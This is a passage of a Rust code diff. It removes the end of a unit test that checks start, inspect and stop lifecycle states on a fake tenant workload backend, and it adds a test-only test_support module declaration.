-            .expect("fake backend start should produce workload status");
-        assert_eq!(started.phase(), TenantWorkloadPhase::Running);
-
-        let inspected = backend
-            .inspect(execution_id.clone())
-            .await
-            .expect("fake backend should track started workload");
-        assert_eq!(inspected.reason(), HostLifecycleStatusReason::Running);
-
-        let stopped = backend
-            .stop(execution_id.clone())
-            .await
-            .expect("fake backend should stop tracked workload");
-        assert_eq!(stopped.reason(), HostLifecycleStatusReason::Stopped);
-
-        let inspected = backend
-            .inspect(execution_id)
-            .await
-            .expect("fake backend should update stopped state");
-        assert_eq!(inspected.reason(), HostLifecycleStatusReason::Stopped);
-    }
-}
+#[cfg(test)]
+pub(crate) mod test_support;
